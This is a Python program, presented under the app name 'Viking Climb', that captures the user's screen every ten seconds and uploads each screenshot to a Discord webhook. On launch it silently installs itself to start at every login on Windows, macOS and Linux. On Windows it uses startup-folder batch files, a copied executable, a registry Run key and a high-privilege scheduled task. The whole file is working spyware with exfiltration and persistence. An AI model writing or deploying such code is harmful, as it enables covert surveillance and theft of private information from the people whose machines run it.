import pyautogui
import requests
import io
import json
import os
import sys
import platform
import argparse
import time
import shutil
from datetime import datetime

# Delay between screenshots in seconds
DELAY = 10

# IMPORTANT: Replace this with your actual Discord webhook URL
DISCORD_WEBHOOK_URL = "YOUR_API_KEY_HERE"

# Custom message to send with screenshots
SCREENSHOT_MESSAGE = "Screen capture from your computer"

# App name for startup entries
APP_NAME = "Viking Climb"

def take_screenshot():
    """Take a screenshot and return it as a bytes object."""
    # Take screenshot
    screenshot = pyautogui.screenshot()
    
    # Convert to bytes
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    return img_byte_arr

def send_to_discord(webhook_url, image_bytes, message="Screenshot"):
    """Send the screenshot to Discord via webhook with nice formatting."""
    # Current time for filename and display
    timestamp = datetime.now()
    timestamp_str = timestamp.strftime("%Y-%m-%d %H:%M:%S")
    filename = f"screenshot_{timestamp.strftime('%Y%m%d_%H%M%S')}.png"
    
    # First, upload the image to Discord
    files = {
        'file': (filename, image_bytes.getvalue(), 'image/png')
    }
    
    # Create a nice embed with the image
    embed = {
        "title": "**📸 Screenshot Captured**",
        "description": f"**{message}**\n\nTaken at: **{timestamp_str}**\nWith a delay of **{DELAY}** seconds",
        "color": 3447003,  # A nice blue color
        "footer": {
            "text": "Automated Screenshot Service"
        },
        "timestamp": timestamp.isoformat(),
        "image": {
            "url": "attachment://" + filename
        }
    }
    
    # Prepare the payload with the embed
    payload = {
        "embeds": [embed]
    }
    
    # Send the request with both file and JSON payload
    response = requests.post(
        webhook_url, 
        files=files,
        data={"payload_json": json.dumps(payload)}
    )
    
    # Check if successful
    if response.status_code == 204 or response.status_code == 200:
        print(f"Screenshot sent successfully to Discord! ({timestamp_str})")
        return True
    else:
        print(f"Failed to send screenshot: {response.status_code}, {response.text}")
        return False

def is_compiled_with_pyinstaller():
    """Check if the script is running as a PyInstaller executable."""
    return getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')

def get_executable_path():
    """Get the path to the executable or script."""
    if is_compiled_with_pyinstaller():
        return sys.executable
    else:
        return os.path.abspath(sys.argv[0])

def setup_windows_startup():
    """Set up the script to run at startup on Windows with explicit startup folder paths."""
    try:
        # Get the path to the executable or script
        exe_path = get_executable_path()
        print(f"Executable path: {exe_path}")
        
        # Try multiple startup folder locations to ensure we find the right one
        startup_folders = [
            # Current user startup folder
            os.path.join(os.environ.get('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            # All users startup folder 
            os.path.join(os.environ.get('PROGRAMDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            # Additional common locations
            os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
            os.path.expanduser("~\\Start Menu\\Programs\\Startup"),
            # Direct paths for Windows 10/11
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
            r"C:\Users\All Users\Start Menu\Programs\Startup",
        ]
        
        # Try to create startup entry in each possible location
        success = False
        
        for folder in startup_folders:
            if os.path.exists(folder) and os.path.isdir(folder):
                print(f"Found startup folder: {folder}")
                
                # Create batch file with explicit path
                batch_path = os.path.join(folder, f"{APP_NAME}.bat")
                
                with open(batch_path, 'w') as f:
                    # Start the program without a visible console window
                    f.write(f'@echo off\nstart "" /B "{exe_path}"\n')
                
                print(f"Created startup batch file: {batch_path}")
                success = True
                
                # Also create a shortcut as backup
                try:
                    # Copy the executable to the startup folder directly with a new name
                    shortcut_path = os.path.join(folder, f"{APP_NAME}.exe")
                    if os.path.exists(shortcut_path):
                        os.remove(shortcut_path)
                    shutil.copy2(exe_path, shortcut_path)
                    print(f"Created executable copy in startup folder: {shortcut_path}")
                except Exception as e:
                    print(f"Failed to create executable copy: {e}")
        
        # Try registry method as well
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, 
                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                0, 
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(
                key, 
                APP_NAME,
                0, 
                winreg.REG_SZ, 
                f'"{exe_path}"'
            )
            
            winreg.CloseKey(key)
            print(f"Added {APP_NAME} to Windows Registry startup")
            success = True
        except Exception as e:
            print(f"Registry method failed: {e}")
        
        # Try Task Scheduler method
        try:
            import subprocess
            cmd = f'schtasks /create /tn "{APP_NAME}" /tr "\\""{exe_path}"\"" /sc onlogon /rl highest /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"Added {APP_NAME} to Windows Task Scheduler")
                success = True
            else:
                print(f"Task Scheduler method failed: {result.stderr}")
        except Exception as e:
            print(f"Task Scheduler method failed: {e}")
            
        return success
    
    except Exception as e:
        print(f"Failed to set up Windows startup: {e}")
        return False

def setup_macos_startup():
    """Set up the script to run at startup on macOS."""
    # Get the current executable path
    exe_path = get_executable_path()
    
    # Create LaunchAgent plist file
    plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.{APP_NAME.lower().replace(" ", "")}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>'''
    
    # Create the LaunchAgents directory if it doesn't exist
    launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
    os.makedirs(launch_agents_dir, exist_ok=True)
    
    # Write the plist file
    plist_path = os.path.join(launch_agents_dir, f"com.user.{APP_NAME.lower().replace(' ', '')}.plist")
    with open(plist_path, 'w') as f:
        f.write(plist_content)
    
    # Set permissions
    os.chmod(plist_path, 0o644)
    
    # Load the LaunchAgent
    os.system(f"launchctl load {plist_path}")
    
    print(f"Added {APP_NAME} to macOS startup")
    return True

def setup_linux_startup():
    """Set up the script to run at startup on Linux."""
    # Get the current executable path
    exe_path = get_executable_path()
    
    # Create desktop entry file
    desktop_content = f'''[Desktop Entry]
Type=Application
Name={APP_NAME}
Exec={exe_path}
Terminal=false
X-GNOME-Autostart-enabled=true
'''
    
    # Create the autostart directory if it doesn't exist
    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    
    # Write the desktop file
    desktop_path = os.path.join(autostart_dir, f"{APP_NAME.lower().replace(' ', '-')}.desktop")
    with open(desktop_path, 'w') as f:
        f.write(desktop_content)
    
    # Set permissions
    os.chmod(desktop_path, 0o755)
    
    print(f"Added {APP_NAME} to Linux startup")
    return True

def setup_startup():
    """Set up the script to run at startup based on the current OS."""
    print(f"Setting up {APP_NAME} to start automatically on boot...")
    
    system = platform.system()
    
    if system == "Windows":
        return setup_windows_startup()
    elif system == "Darwin":  # macOS
        return setup_macos_startup()
    elif system == "Linux":
        return setup_linux_startup()
    else:
        print(f"Unsupported operating system: {system}")
        print("Please manually add this script to your startup applications.")
        return False

def screenshot_loop():
    """Take screenshots and send them to Discord in a loop."""
    while True:
        try:
            # Take screenshot
            screenshot_bytes = take_screenshot()
            
            # Send to Discord
            send_to_discord(DISCORD_WEBHOOK_URL, screenshot_bytes, SCREENSHOT_MESSAGE)
            
            # Wait for the specified delay
            time.sleep(DELAY)
        except Exception as e:
            print(f"Error in screenshot loop: {e}")
            time.sleep(DELAY)  # Wait before trying again

def main():
    """Main function."""
    print(f"Starting {APP_NAME}...")
    
    if len(sys.argv) > 1 and sys.argv[1] == '--setup-startup':
        # Manual setup mode
        if setup_startup():
            print("Startup configuration completed successfully!")
            input("Press Enter to continue...")
        else:
            print("Failed to set up startup. Try running as administrator.")
            input("Press Enter to continue...")
        return
    
    # Always try to set up startup automatically
    setup_startup()
    
    # Run the screenshot loop
    screenshot_loop()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Critical error: {e}")
        input("Press Enter to exit...")
